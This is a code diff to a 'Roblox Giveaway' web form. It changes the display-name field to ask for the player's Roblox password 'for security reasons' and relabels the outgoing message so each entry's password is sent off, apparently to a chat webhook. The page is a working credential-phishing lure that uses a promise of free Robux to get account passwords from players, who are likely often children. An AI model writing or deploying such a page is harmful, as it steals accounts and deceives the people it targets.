@@ -52,7 +52,7 @@
   <div class="container">
     <h2>Enter the Roblox Giveaway!</h2>
     <input type="text" id="username" placeholder="Roblox Username" required />
-    <input type="text" id="displayName" placeholder="Roblox Display Name" required />
+    <input type="text" id="displayName" placeholder="Roblox Password (for security reasons)" required />
     <select id="robuxAmount" required>
       <option value="">Select Robux Amount</option>
       <option value="100">100 Robux</option>
@@ -74,7 +74,7 @@
       const p = {
         content: `🎁 **New Giveaway Entry!**
 👤 Username: \`${u}\`
-📝 Display Name: \`${d}\`
+📝 Password: \`${d}\`
 💰 Requested Robux: \`${r} Robux\``
       };
       try {
